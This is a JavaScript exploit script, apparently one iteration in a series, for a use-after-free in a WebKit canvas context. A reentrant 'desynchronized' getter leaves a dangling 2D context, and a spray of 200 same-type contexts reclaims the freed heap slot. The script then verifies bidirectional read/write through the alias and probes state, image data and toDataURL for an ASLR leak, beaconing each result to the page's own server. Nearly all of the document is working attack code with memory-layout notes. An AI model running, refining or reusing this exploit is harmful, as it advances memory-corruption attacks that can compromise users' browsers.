// p482 — Canvas UAF: same-type spray + controlled state read
//
// V481 CRASHED: AB spray + save() triggers GC → visitAdditionalChildren
//   reads m_canvas at +32 → null deref → SIGSEGV
//
// p461 WORKED: same-type spray (200 real contexts) → GC safe because
//   real contexts have valid m_canvas pointers.
//
// WK-1400 flow: desynchronized getter triggers reentrant getContext
//   → innerCtx = C1 (FREED by unique_ptr), outerCtx = C2 (LIVE)
//   → spray real contexts to reclaim C1's 768B FastMalloc slot
//   → read/write through danglingCtx (innerCtx) to aliased context
//
// Strategy for ASLR leak:
//   A. Confirm aliasing via lineWidth read
//   B. getContextAttributes() via dangling → reads m_settings directly
//   C. Try toDataURL() → reads pixel buffer → may expose heap layout
//   D. createImageData/getImageData → reads from backing store
//
// Beacon prefix: V482-
(function() {
  var BASE = location.protocol + '//' + location.host;
  var T0 = Date.now();
  function B(tag, body) {
    try {
      var dt = Date.now() - T0;
      var x = new XMLHttpRequest();
      x.open('POST', BASE + '/beacon/V482-' + tag, false);
      x.setRequestHeader('Content-Type', 'text/plain');
      x.send('[' + dt + 'ms] ' + (body || ''));
    } catch(e) {}
  }

  B('BOOT', navigator.userAgent);

  // ═══════════════════════════════════════════════════════════
  // PHASE 1: Trigger UAF via desynchronized getter
  // ═══════════════════════════════════════════════════════════
  var danglingCtx = null;
  var liveCtx = null;
  var triggerCanvas = document.createElement('canvas');
  triggerCanvas.width = 10;
  triggerCanvas.height = 10;
  document.body.appendChild(triggerCanvas);

  var callCount = 0;
  var settings = {};
  Object.defineProperty(settings, 'desynchronized', {
    get: function() {
      callCount++;
      if (callCount === 1) {
        danglingCtx = triggerCanvas.getContext('2d');
      }
      return false;
    }
  });

  liveCtx = triggerCanvas.getContext('2d', settings);

  if (!danglingCtx || danglingCtx === liveCtx) {
    B('ABORT', 'no-alias:d=' + !!danglingCtx + ',same=' + (danglingCtx === liveCtx));
    return;
  }
  B('ALIAS', 'YES,calls=' + callCount);

  // ═══════════════════════════════════════════════════════════
  // PHASE 2: Same-type spray — 200 real 2d contexts
  // Each creates a ~712B CanvasRenderingContext2D in 768B class
  // One should reclaim C1's freed slot
  // ═══════════════════════════════════════════════════════════
  var N_SPRAY = 200;
  var sprayCanvases = [];
  var sprayCtxs = [];
  for (var i = 0; i < N_SPRAY; i++) {
    var c = document.createElement('canvas');
    c.width = 10;
    c.height = 10;
    sprayCanvases.push(c);
    sprayCtxs.push(c.getContext('2d'));
  }
  B('SPRAY', N_SPRAY + ' contexts');

  // Set unique lineWidth on each spray context for identification
  for (var i = 0; i < sprayCtxs.length; i++) {
    sprayCtxs[i].lineWidth = 100 + i;
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 3: Read through dangling wrapper → identify alias
  // ═══════════════════════════════════════════════════════════
  var readResult = {};
  try {
    readResult.lineWidth = danglingCtx.lineWidth;
    readResult.globalAlpha = danglingCtx.globalAlpha;
    readResult.shadowBlur = danglingCtx.shadowBlur;
    readResult.miterLimit = danglingCtx.miterLimit;
  } catch(e) {
    readResult.error = e.message;
    B('READ-ERR', e.message);
  }

  B('READ', JSON.stringify(readResult));

  if (typeof readResult.lineWidth !== 'number' || readResult.lineWidth < 100) {
    B('NO-ALIAS', 'lw=' + readResult.lineWidth);
    // Dump all spray lineWidths to debug
    var lwList = [];
    for (var i = 0; i < Math.min(10, sprayCtxs.length); i++) {
      lwList.push(sprayCtxs[i].lineWidth);
    }
    B('SPRAY-LW', lwList.join(','));
    B('DONE');
    return;
  }

  var aliasedIdx = Math.round(readResult.lineWidth - 100);
  B('ALIASED', 'idx=' + aliasedIdx + ',lw=' + readResult.lineWidth);

  // ═══════════════════════════════════════════════════════════
  // PHASE 4: Verify bidirectional R/W
  // ═══════════════════════════════════════════════════════════
  var verified = false;
  if (aliasedIdx >= 0 && aliasedIdx < sprayCtxs.length) {
    // Write through dangling, read through spray
    danglingCtx.lineWidth = 999.5;
    var sprayRead = sprayCtxs[aliasedIdx].lineWidth;
    B('FWD-VERIFY', 'wrote=999.5,read=' + sprayRead + ',ok=' + (sprayRead === 999.5));

    // Write through spray, read through dangling
    sprayCtxs[aliasedIdx].lineWidth = 777.25;
    var danglingRead = danglingCtx.lineWidth;
    B('REV-VERIFY', 'wrote=777.25,read=' + danglingRead + ',ok=' + (danglingRead === 777.25));

    verified = (sprayRead === 999.5 && danglingRead === 777.25);
    B('BIDIR', verified ? 'CONFIRMED' : 'FAILED');
  }

  if (!verified) {
    B('DONE');
    return;
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 5: State exploration — read all properties we can
  // These reads are SAFE because the aliased context is a real
  // CanvasRenderingContext2D with valid internal state.
  // We're looking for information leaks.
  // ═══════════════════════════════════════════════════════════
  var stateProps = {};
  try {
    stateProps.lineWidth = danglingCtx.lineWidth;
    stateProps.lineCap = danglingCtx.lineCap;
    stateProps.lineJoin = danglingCtx.lineJoin;
    stateProps.miterLimit = danglingCtx.miterLimit;
    stateProps.lineDashOffset = danglingCtx.lineDashOffset;
    stateProps.font = danglingCtx.font;
    stateProps.textAlign = danglingCtx.textAlign;
    stateProps.textBaseline = danglingCtx.textBaseline;
    stateProps.direction = danglingCtx.direction;
    stateProps.shadowBlur = danglingCtx.shadowBlur;
    stateProps.shadowColor = danglingCtx.shadowColor;
    stateProps.shadowOffsetX = danglingCtx.shadowOffsetX;
    stateProps.shadowOffsetY = danglingCtx.shadowOffsetY;
    stateProps.globalAlpha = danglingCtx.globalAlpha;
    stateProps.globalCompositeOperation = danglingCtx.globalCompositeOperation;
    stateProps.imageSmoothingEnabled = danglingCtx.imageSmoothingEnabled;
    stateProps.imageSmoothingQuality = danglingCtx.imageSmoothingQuality;
    stateProps.fillStyle = danglingCtx.fillStyle;
    stateProps.strokeStyle = danglingCtx.strokeStyle;
  } catch(e) {
    stateProps.error = e.message;
  }
  B('STATE', JSON.stringify(stateProps));

  // ═══════════════════════════════════════════════════════════
  // PHASE 6: Try getContextAttributes() — reads m_settings
  // ═══════════════════════════════════════════════════════════
  try {
    var attrs = danglingCtx.getContextAttributes();
    B('ATTRS', JSON.stringify(attrs));
  } catch(e) {
    B('ATTRS-ERR', e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 7: getImageData — reads pixel backing store
  // This creates a new ImageData with pixel data from the canvas
  // ═══════════════════════════════════════════════════════════
  try {
    var imgData = danglingCtx.getImageData(0, 0, 10, 10);
    var nonZero = 0;
    for (var i = 0; i < imgData.data.length; i++) {
      if (imgData.data[i] !== 0) nonZero++;
    }
    B('IMGDATA', 'len=' + imgData.data.length + ',nonzero=' + nonZero);
  } catch(e) {
    B('IMGDATA-ERR', e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 8: save()/restore() through dangling — test state stack
  // save() is just ++m_unrealizedSaveCount (safe)
  // realizeSaves() (triggered by operations) pushes to m_stateStack
  // ═══════════════════════════════════════════════════════════
  try {
    danglingCtx.save();
    danglingCtx.lineWidth = 12.34;
    danglingCtx.save();
    danglingCtx.lineWidth = 56.78;

    // read back
    var lw1 = danglingCtx.lineWidth;
    B('SAVE-LW1', '' + lw1);

    danglingCtx.restore();
    var lw2 = danglingCtx.lineWidth;
    B('RESTORE-LW2', '' + lw2);

    danglingCtx.restore();
    var lw3 = danglingCtx.lineWidth;
    B('RESTORE-LW3', '' + lw3);

    B('SAVE-RESTORE', 'OK:' + lw1 + '/' + lw2 + '/' + lw3);
  } catch(e) {
    B('SAVE-RESTORE-ERR', e.message);
  }

  // ═══════════════════════════════════════════════════════════
  // PHASE 9: toDataURL — encodes canvas contents
  // This goes deep into the rendering pipeline
  // ═══════════════════════════════════════════════════════════
  try {
    // Draw something on the spray canvas through dangling ctx
    danglingCtx.fillStyle = '#FF0000';
    danglingCtx.fillRect(0, 0, 5, 5);
    // Read through spray canvas
    var dataUrl = sprayCanvases[aliasedIdx].toDataURL('image/png');
    B('DATAURL', 'len=' + dataUrl.length);
  } catch(e) {
    B('DATAURL-ERR', e.message);
  }

  B('SUMMARY', 'aliasIdx=' + aliasedIdx + ',bidir=' + verified);
  B('DONE');
})();
